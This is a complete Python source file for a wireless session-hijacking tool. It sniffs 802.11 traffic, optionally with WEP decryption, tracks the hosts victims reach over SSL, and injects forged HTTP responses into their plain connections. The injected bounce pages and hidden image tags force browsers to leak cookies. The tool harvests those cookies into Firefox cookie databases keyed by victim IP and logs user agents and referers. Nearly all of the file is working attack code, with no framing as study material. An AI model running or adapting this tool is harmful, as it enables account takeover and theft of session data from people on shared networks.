#!/usr/bin/python

# TODO:
# 1. Add more paths for common sites
# 2. Handle ethernet

FORCE_FF3=False
try:
  # maek teh codez run fastr plz, kthxbye
  # P.S. Lets see you do this, Ruby :)
  import psyco
  psyco.full()
  import sys
  import os
except ImportError:
  import os
  import sys
  # FC9 live CD does not have psyco, but does have the following kernel
  # This hack also lets us source FC9 binary versions of the other modules too
  if "2.6.25-14.fc9" in os.uname()[2]:
    try:
      FORCE_FF3=True
      sys.path.insert(0, './FC9Live-binaries/')
      import psyco
      psyco.full()
    except ImportError:
      print >>sys.stderr,  '%s: Psyco not installed. No JIT optimization.' % sys.argv[0]
  else:
    print >>sys.stderr,  '%s: Psyco not installed. No JIT optimization.' % sys.argv[0]
  

try:
  from pysqlite2 import dbapi2 as sqlite
  CAN_HAS_FF3=True
except ImportError:
  print >>sys.stderr, '%s: Sqlite2 not installed. No Firefox 3 support.' % sys.argv[0]
  CAN_HAS_FF3=False
  
import socket
import getopt
import copy
import random
random.seed()

# Make use of janky local imports instead of system versions
try:
  subdirs = os.listdir("./pypcap-svn/build/")
  for subdir in subdirs:
    if "lib" in subdir:
      sys.path.insert(0, './pypcap-svn/build/'+subdir)
      break
except OSError:
  sys.path.insert(0, './pypcap-svn/build/lib.linux-i686-2.5/')
import pcap

try:
  subdirs = os.listdir("./pylorcon-svn/build/")
  for subdir in subdirs:
    if "lib" in subdir:
      sys.path.insert(0, './pylorcon-svn/build/'+subdir)
      break
except OSError:
  sys.path.insert(0, './pylorcon-svn/build/lib.linux-i686-2.5/')
import pylorcon

sys.path.insert(0, './dpkt-svn/')
import dpkt

from config_settings import *

INJECT_HTTP_HEADER = 'HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html\r\nContent-Length: '

# Bounce injection html:
# FIXME: Shoul this be a 302 redirect instead?
BOUNCE_PAGE_HEAD = '<html><head><meta http-equiv="refresh" content="0; URL=http://'
BOUNCE_PAGE_MID = '/"></head><body bgcolor="white" fgcolor="white" onLoad="window.location.replace(\'http://'
BOUNCE_PAGE_TAIL = '\');"></body></html>'

# Image injection html:
INJECT_PAGE_HEAD = '<html><head><meta http-equiv="refresh" content="1"></head><body bgcolor=white fgcolor=white onLoad="window.location.reload(true);">'
INJECT_PAGE_TAIL = '</body></html>'

INJECT_TAG_HEAD = '<img width="1" height="1" src="http://'
INJECT_TAG_TAIL = '/">'

 

PRISM_HEADER="\x44\x00\x00\x00\x08\x00\x00\x00"
IWLRAW_HEADER=""
LORCON_HEADER=IWLRAW_HEADER


# For checksumming:
import binascii
from binascii import hexlify as hexl, unhexlify as unhexl
import struct
# convert numbers to binary strings, and back.  The incoming numbers
# can be ints, longs, or mpz's.  Their hex representations all look
# different from each other so we have to account for that.
def nstr(n):
    n = n & 0xFFFFFFFF
    h=hex(n)[2:]                        # remove 0x prefix
    if h[-1:]=='L': h=h[:-1]            # remove L suffix if present
    if len(h)&1: h="0"+h
    return unhexl(h)

def strn(s):
    return long(hexl(s),16)

def usage():
  print >>sys.stderr, 'usage: %s -i <device> -d <driver> [-c <channel>] [-b <BSSID/Target MAC>] [-k <wep_key>] [--ff3] [-u] [-r] [--aggressive]' % sys.argv[0]
  out = "\nSupported cards are:"
  cards = pylorcon.getcardlist()
  
  for i in cards:
    out += " " + i["name"]
  print >>sys.stderr, out

  sys.exit(1)


loglevel = "DBUG"
loglevels = {"DBUG" : 0, "INFO" : 1, "NOTE" : 2, "WARN" : 3, "ERROR" : 4}

def plog(level, msg): 
  if(loglevels[level] >= loglevels[loglevel]):
    #t = time.strftime("%a %b %d %H:%M:%S %Y")
    #print level, '[', t, ']:', msg
    print level+": "+msg
    sys.stdout.flush()


class DNSTable:
  def __init__(self): 
    self.tbl = {}

  def store(self, dns_resp):
    # FIXME: hmm.. This is not reliable..
    for ans in dns_resp.an[0:]:
      self.tbl[ans.rdata] = dns_resp.an[0].name 
      try: plog("DBUG", "Stored map for "+dns_resp.an[0].name+":"+socket.inet_ntoa(ans.rdata))
      except: pass
  
  def lookup(self, ip): 
    if not ip in self.tbl: return None
    plog("DBUG", "Connect to: " + self.tbl[ip]) 
    return self.tbl[ip]

class Target:
  def __init__(self, tgt_ip):
    self.tgt_ip = tgt_ip
    self.tgt_hosts = ALWAYS_TARGET
    self.pwnt_hosts = {}
    self.counts = {}

  def set_ip(self, tgt_ip):
    self.tgt_ip = tgt_ip

  def add_host(self, host):
    if not host in self.pwnt_hosts:
      plog("INFO", "Added new host "+host+" for "+self.tgt_ip)
      self.tgt_hosts[host] = True

  def mark_pwnt(self, host):
    if host in self.tgt_hosts: del self.tgt_hosts[host]
    self.pwnt_hosts[host] = True

  def is_pwnt(self, host):
    return host in self.pwnt_hosts

  def count_attempts(self, host):
    # Start at 1 because of how the inject loop works
    # (We want to avoid injecting an empty payload)
    if not host in self.counts: self.counts[host] = 1
    self.counts[host] += 1
    return self.counts[host]

  def enum_targets(self):
    for host in self.tgt_hosts.keys():
      if self.tgt_hosts[host] and not self.is_pwnt(host):
        yield host

  def enum_pwnt(self):
    for host in self.pwnt_hosts.keys():
      if self.pwnt_hosts[host]:
        yield host

  def is_pwnable(self):
    if self.tgt_hosts: return True
    else: return False

  def is_target_host(self, host):
    return host in self.tgt_hosts 

class TargetTable:
  def __init__(self):
    self.default_target = Target("default")
    self.targets = {}

  def mark_pwnt(self, tgt_ip, host):
    self.targets[tgt_ip].mark_pwnt(host)

  def is_pwnt(self, tgt_ip, host):
    return self.targets[tgt_ip].is_pwnt(host) 
 
  def count_attempts(self, tgt_ip, host):
    return self.targets[tgt_ip].count_attempts(host)  
 
  def add_target(self, tgt_ip, host=None): 
    if not tgt_ip in self.targets:
      plog("INFO", "New IP: "+tgt_ip)
      tgt = copy.copy(self.default_target)
      tgt.set_ip(tgt_ip)
      if host: tgt.add_host(host)
      self.targets[tgt_ip] = tgt
    else:
      if host: self.targets[tgt_ip].add_host(host)

  def is_target_host(self, tgt_ip, host):
    if tgt_ip in self.targets:
      return self.targets[tgt_ip].is_target_host(host)
    else:
      plog("DBUG", "Host "+host+" is not a target for: "+tgt_ip) 
      return False
 
  def enum_targets(self, tgt_ip):
    return self.targets[tgt_ip].enum_targets()

  def is_target(self, tgt_ip):
    return tgt_ip in self.targets
 
  def is_pwnable(self, tgt_ip):
    return self.targets[tgt_ip].is_pwnable()
  
class CookieTracker:
  def __init__(self, use_ff3):
    self.tbl = {}
    self.use_ff3 = use_ff3

  def unique(self, cookie):
    if cookie in self.tbl: return False
    self.tbl[cookie] = 1
    return True

  def write_cookies(self, ip, host, cookie_list):
    if self.use_ff3:
      self.write_ff3_cookies(ip, host, cookie_list)
    else:
      self.write_ff2_cookies(ip, host, cookie_list)

  def write_ff2_cookies(self, ip, host, cookie_list):
    f = file("./cookies/"+ip+"-cookies.txt", "a+")
    for cookie in cookie_list:
      if self.unique(ip+host+cookie):
        f.write("."+host+"\tTRUE\t/\tFALSE\t"+str(0x7fffffff)+"\t"+("\t".join(cookie.strip().split("=", 1)))+"\n")
        plog("NOTE", "Wrote ff2 cookie for "+host+" via ip "+ip)
    if cookie_list:
      plog("NOTE", "Wrote "+str(len(cookie_list))+" ff2 cookie(s) for "+host+" via ip "+ip)
    f.close()

  def write_ff3_cookies(self, ip, host, cookie_list):
    # FIXME: Is creating new sqlite connections expensive? Maybe
    # we should store all these connections in a table per IP?
    conn = sqlite.connect("./cookies/"+ip+"-cookies.sqlite")
    c = conn.cursor()
    c.execute("""\
CREATE TABLE IF NOT EXISTS moz_cookies (id INTEGER PRIMARY KEY, name TEXT,
    value TEXT, host TEXT, path TEXT,expiry INTEGER,
    lastAccessed INTEGER, isSecure INTEGER, isHttpOnly INTEGER)""")
    for cookie in cookie_list:
      (name, value) = cookie.strip().split("=", 1)
      c.execute("SELECT id FROM moz_cookies WHERE name='%s' AND host='%s'" % (name, host))
      ids = c.fetchall()
      if not ids:
        mid = random.randint(1, 0xffffffff)
      else:
        mid = ids[0][0]
      c.execute("INSERT OR REPLACE INTO moz_cookies VALUES(%d, '%s', '%s', '%s', '/', %d, %d, 0, 0)" \
              % (mid, name, value, host, 0x7fffffff, 0))
      plog("INFO", "Wrote ff3 cookie "+name+" for "+host+" via ip "+ip)
    if cookie_list:
      plog("NOTE", "Wrote "+str(len(cookie_list))+" ff3 cookie(s) for "+host+" via ip "+ip)
    c.close()
    conn.commit()
    conn.close()
    return True 

def build_inject_data(ip, targets, do_bounce):
  # If any targets are in FULL_BOUNCE_FOR, do the bounce, 
  # and skip the rest
  if do_bounce:
    ret = BOUNCE_PAGE_HEAD
    for h in targets.enum_targets(ip): 
      if h in FULL_BOUNCE_FOR:
        if targets.count_attempts(ip, h) > MAX_ATTEMPTS:
          plog("NOTE", "Too many attempts for "+ip+" on "+h)
          targets.mark_pwnt(ip, h)
 
        if h not in COMMON_PATHS:
          url = "http://"+h
        else: 
          url = h+COMMON_PATHS[h][0]
        
        ret += url+BOUNCE_PAGE_MID+url
 
        ret += BOUNCE_PAGE_TAIL+"\r\n"
        ret = INJECT_HTTP_HEADER+str(len(ret))+"\r\n\r\n"+ret
        plog("INFO", "Doing bounce attack")
        return ret
  
  # Do Image injection
  ret = INJECT_PAGE_HEAD
  for h in targets.enum_targets(ip):
    if targets.count_attempts(ip, h) > MAX_ATTEMPTS:
      plog("NOTE", "Too many attempts for "+ip+" on "+h)
      targets.mark_pwnt(ip, h)

    if h not in COMMON_PATHS:
      ret += INJECT_TAG_HEAD+h+INJECT_TAG_TAIL
    else: 
      for p in COMMON_PATHS[h]:
        ret += INJECT_TAG_HEAD+h+p+INJECT_TAG_TAIL
  
  ret += INJECT_PAGE_TAIL+"\r\n"
  ret = INJECT_HTTP_HEADER+str(len(ret))+"\r\n\r\n"+ret
  
  return ret

def do_inject(tx, pkt, ip, targets, is_wep, wep_key, do_bounce):
  resp_pkt = copy.deepcopy(pkt)

  # Switch 802.11 mac addresses
  resp_pkt.subtype = 0x08 # Force pure "Data". No QoS bits.
  resp_pkt.mac2 = pkt.mac2
  resp_pkt.mac0 = pkt.mac1
  resp_pkt.mac1 = pkt.mac0
  resp_pkt.fc = 2 # "From BSS"
  
  # Switch IP addresses
  resp_pkt.data.data = copy.copy(pkt.data.data)
  resp_pkt.data.data.dst = pkt.data.data.src
  resp_pkt.data.data.src = pkt.data.data.dst

  inject_data = build_inject_data(ip, targets, do_bounce)
  
  plog("INFO", "Injecting:\n"+inject_data)
  ack_len = pkt.data.data.len-(pkt.data.data.hl<<2)-(pkt.data.data.data.off_x2>>2)

  # Switch TCP ports and build packet
  resp_pkt.data.data.data = dpkt.tcp.TCP(dport=pkt.data.data.data.sport, sport=pkt.data.data.data.dport, data=inject_data, flags=0x18, seq=pkt.data.data.data.ack, ack=pkt.data.data.data.seq+ack_len, sum=0)
  resp_pkt.data.data.id = 1
  resp_pkt.data.data.len = len(str(resp_pkt.data.data))

  # Calculate IP checksum..
  resp_pkt.data.data.sum = 0
  ip_chksum = dpkt.dpkt.in_cksum(str(resp_pkt.data.data)[:(resp_pkt.data.data.hl<<2)]) 
  resp_pkt.data.data.sum = ip_chksum

  resp_pkt.data.data.data.sum = 0
  # Calculate TCP checksum..
  tcp_pkt = str(resp_pkt.data.data.data)
  psdhdr = struct.pack("!4s4sHH",
                       resp_pkt.data.data.src, resp_pkt.data.data.dst,
                       6, len(str(resp_pkt.data.data.data)))
  cksum = dpkt.dpkt.in_cksum(psdhdr+tcp_pkt)
  resp_pkt.data.data.data.sum = cksum

  if is_wep and wep_key: resp_pkt.wep("\x23\x42\x16", wep_key) 
  tx.txpacket(LORCON_HEADER+resp_pkt.pack())

  if SEND_RST: 
    resp_pkt.data.data.data = dpkt.tcp.TCP(dport=pkt.data.data.data.sport, sport=pkt.data.data.data.dport, flags=0xC, seq=pkt.data.data.data.ack+len(inject_data), win=33304, sum=0, data="")

    # Calculate IP checksum..
    resp_pkt.data.data.sum = 0
    ip_chksum = dpkt.dpkt.in_cksum(str(resp_pkt.data.data)[:(resp_pkt.data.data.hl<<2)]) 
    resp_pkt.data.data.sum = ip_chksum
  
    # Calculate TCP checksum..
    tcp_pkt = str(resp_pkt.data.data.data)
    psdhdr = struct.pack("!4s4sHH",
                       resp_pkt.data.data.src, resp_pkt.data.data.dst,
                       6, len(str(resp_pkt.data.data.data)))
    cksum = dpkt.dpkt.in_cksum(psdhdr+tcp_pkt)
    resp_pkt.data.data.data.sum = cksum

    if is_wep and wep_key: resp_pkt.wep("\x42\x16\x23", wep_key) 
    tx.txpacket(LORCON_HEADER+resp_pkt.pack())
 
  return  

def log_referer(ip, referer):
  f = file("./cookies/referer.log", "a+")
  f.write(ip+": "+referer+"\n")
  f.close()
 

def main():
  try:
    opts, args = getopt.gnu_getopt(sys.argv[1:], "hi:d:c:k:b:ur", ["ff3", "aggressive"])
  except getopt.GetoptError:
    usage()
    return

  get_referer = get_uagent = use_ff3 = bssid = wep_key = iface = driver = None
  aggressive_inject = False
  channel = -1

  for o, a in opts:
    if o == "-h" or o == "-?":
      usage()
      return
    if o == "--ff3":
      use_ff3 = True
    if o == "--aggressive":
      aggressive_inject = True
    if o == "-u":
      get_uagent = True
    if o == "-r":
      get_referer = True
    if o == "-i":
      iface = a
    if o == "-d":
      driver = a
    if o == "-k":
      wep_key = binascii.a2b_hex(a)
    if o == "-b":
      bssid = binascii.a2b_hex(a.replace(":", ""))
    if o == "-c":
      channel = int(a)
  
  if FORCE_FF3: use_ff3 = True 
 
  if use_ff3 and not CAN_HAS_FF3:
    print >>sys.stderr, "%s: Firefox 3 cookie support selected but pysqlite2 not installed\n" % sys.argv[0]
    return 

  if iface == None:
    print >>sys.stderr, "%s: Must specify an interface name.\n" % sys.argv[0]
    usage()
    return

  if driver == None:
    print >>sys.stderr,"%s: Driver name not recognized.\n" % sys.argv[0]
    usage()
    return
  
  #if wep_key != None and bssid == None:
  #  print >>sys.stderr, "%s: Need BSSID for WEP decryption" % sys.argv[0]
  #  usage()
  #  return 

  tx = pylorcon.Lorcon(iface, driver)
  tx.setfunctionalmode("INJECT")
  if channel != -1: tx.setchannel(channel)
  
  try:
    tx.setmodulation("DSSS") # XXX?
  except pylorcon.LorconError:
    pass

  try:
    tx.settxrate(1) # XXX?
  except pylorcon.LorconError:
    pass

  pc = pcap.pcap(iface)
 
  #if not wep_key:
    # Let teh kernel do the filtering before it hits slow userland+python 
    #pc.setfilter("udp src port 53 or tcp dst port 443 or tcp dst port 80 and host 10.212.96.152")
 
  dns_table = DNSTable()
  cookie_jars = CookieTracker(use_ff3)
  tgt_table = TargetTable()
  data_tracker = {}
  recorded_agents = {}
  decode = {
         #pcap.DLT_LOOP:dpkt.loopback.Loopback,
         #pcap.DLT_NULL:dpkt.loopback.Loopback,
         #pcap.DLT_LINUX_SLL:dpkt.sll.SLL,
         105:lambda(x): dpkt.ieee80211.IEEE80211(x),
         119:lambda(x): dpkt.prism.Prism(x).data,
         127:lambda(x): dpkt.rtap.Rtap(x).data
         #, pcap.DLT_EN10MB:dpkt.ethernet.Ethernet 
         }[pc.datalink()]

  try:
    plog("NOTE", 'listening on %s (%d): %s' % (pc.name, pc.datalink(), pc.filter))
    for ts, pkt in pc:
      try:
        #print "staring to parse"
        try:
          raw_pkt = decode(pkt)
        except Exception, msg:
          plog("WARN", "Parse failure: "+str(msg))
          continue

        dpk = raw_pkt.data
        #print "got something"
        if (not raw_pkt.is_data()) or raw_pkt.is_tkip_ccmp():
          continue

        if bssid:
          if raw_pkt.mac2 != bssid and raw_pkt.mac0 != bssid and raw_pkt.mac1 != bssid:
            #print "Pkt from other mac: "+raw_pkt.mac1
            continue

        is_wep = False
        if raw_pkt.is_wep():
          #print "Wep packet icv1: "+str(strn(raw_pkt.icv))
          if wep_key: # Need to filter data ourselves
            #iv = raw_pkt.iv
            try:
              raw_pkt.unwep(wep_key)
              is_wep = True
            except:
              plog("WARN", "WEP Failure")
              continue
            dpk = raw_pkt.data
            #raw_pkt.wep(iv, wep_key)
            #print "Wep packet icv2: "+str(strn(raw_pkt.icv))
            #continue
          else:
            continue

        if raw_pkt.data.type != dpkt.llc.LLC_TYPE_IP:
          #print "Odd pkt"
          continue

        if raw_pkt.data.data.p != dpkt.ip.IP_PROTO_UDP and \
             raw_pkt.data.data.p != dpkt.ip.IP_PROTO_TCP:
          #print "No TCP/UDP"
          continue

        if dpk.data.data.sport == 53: # DNS response
          plog("DBUG", "DNS response")
          dns_table.store(dpkt.dns.DNS(dpk.data.data.data))
        elif dpk.data.data.dport == 443:
          if dpk.data.data.flags & dpkt.tcp.TH_SYN \
            and not dpk.data.data.flags & dpkt.tcp.TH_ACK:
            ip = socket.inet_ntoa(dpk.data.src)
            plog("INFO", "SSL connect to: "+socket.inet_ntoa(dpk.data.dst))
            host = dns_table.lookup(dpk.data.dst)
            if host:
              if host in IGNORE_HOSTS:
                plog("INFO", "Skipping "+host)
                continue
              tgt_table.add_target(ip, host)
        elif dpk.data.data.dport == 80:
          if dpk.data.data.data:
            try:
              ip = socket.inet_ntoa(dpk.data.src)
              # This may span multiple packets...
              # Need a tracking table if NeedData is raised...
              tup = ip+":"+str(dpk.data.data.sport)+"-"+socket.inet_ntoa(dpk.data.dst)+":"+str(dpk.data.data.dport)
              try:
                if tup in data_tracker:
                  req = dpkt.http.Request(data_tracker[tup]+dpk.data.data.data)
                  plog("INFO", "Clearing tuple: "+tup)
                  del data_tracker[tup]
                else:
                  req = dpkt.http.Request(dpk.data.data.data)
              except dpkt.NeedData, msg:
                plog("INFO", "Tracking tuple "+tup+" for more data: "+str(msg))
                if not tup in data_tracker: data_tracker[tup] = ""
                data_tracker[tup] += dpk.data.data.data
                if len(data_tracker[tup]) > MAX_TRACK_LEN:
                  plog("NOTE", "Dropping excessive tracked data for: "+tup)
                  del data_tracker[tup]
                continue
              except dpkt.UnpackError, msg:
                plog("NOTE", "HTTP error on tuple "+tup+": "+str(msg))
                if tup in data_tracker: del data_tracker[tup]
                continue
              
              # Passively record any cookies while we're at it 
              cookies = host = 0

              if "host" in req.headers: host = req.headers["host"]
              if host: plog("DBUG", "Saw host: "+host)
              else: continue
                
              if "user-agent" in req.headers: 
                user_agent = req.headers["user-agent"]
              else:
                user_agent = ""
                
              if host in IGNORE_HOSTS:
                plog("INFO", "Skipping "+host)
                if tgt_table.is_target_host(ip,host): 
                  tgt_table.mark_pwnt(ip, host)
                continue

              if get_referer and "referer" in req.headers:
                referer = req.headers["referer"] 
                #plog("INFO", "Referer: "+referer)
                for r in LOG_REFERERS_WITH:
                  if r in referer:
                    plog("NOTE", "ZOMG! Insecure referer: "+referer)
                    log_referer(ip, referer)

              if not tgt_table.is_target(ip):
                tgt_table.add_target(ip)
           
              if tgt_table.is_pwnable(ip) \
                and not tgt_table.is_target_host(ip, host) \
                and not tgt_table.is_pwnt(ip, host):
                # Avoid xml, rss, img, etc
                # Check accept string for text/html
                if "accept" in req.headers and \
                  "text/html" in req.headers["accept"] or \
                   "MSIE" in user_agent:
                  plog("INFO", "Valid accept on host "+host+": "+repr(req.headers["accept"]))
                  # Only inject if this is a fresh page load
                  if aggressive_inject or "referer" not in req.headers:
                    do_inject(tx, raw_pkt, ip, tgt_table, is_wep, wep_key, 
                              "referer" not in req.headers)
                  continue
                else:
                  plog("DBUG", "Other accept: "+repr(req.headers["accept"]))


              # We should mark them at this point because for secure
              # SSL sites we will get no cookies 
              tgt_table.mark_pwnt(ip, host)
  
              if "cookie" in req.headers: cookies = req.headers["cookie"]

              if cookies and host:
                cookie_list = cookies.split(";")
                # XXX: Generalize this
                if get_uagent and user_agent:
                  if ip not in recorded_agents or recorded_agents[ip] != user_agent: 
                    recorded_agents[ip] = user_agent
                    f = file("./cookies/uagent.log", "a+")
                    f.write(ip+": "+user_agent+"\n")
                    f.close()
                cookie_jars.write_cookies(ip, host, cookie_list)
            except dpkt.dpkt.UnpackError: pass
      except AttributeError:
        print repr(raw_pkt) 
      except KeyboardInterrupt:
        nrecv, ndrop, nifdrop = pc.stats()
        plog("NOTE", '\n%d packets received by filter' % nrecv)
        plog("NOTE", '%d packets dropped by kernel' % ndrop)
        return
#      except Exception, msg:
#        plog("WARN", "Misc error: "+repr(msg))
  except AttributeError, msg:
    plog("WARN", "Attribute Error on "+repr(raw_pkt)+": "+str(msg))
  except KeyboardInterrupt:
    nrecv, ndrop, nifdrop = pc.stats()
    plog("NOTE", '\n%d packets received by filter' % nrecv)
    plog("NOTE", '%d packets dropped by kernel' % ndrop)
    return

if __name__ == '__main__':
    main()
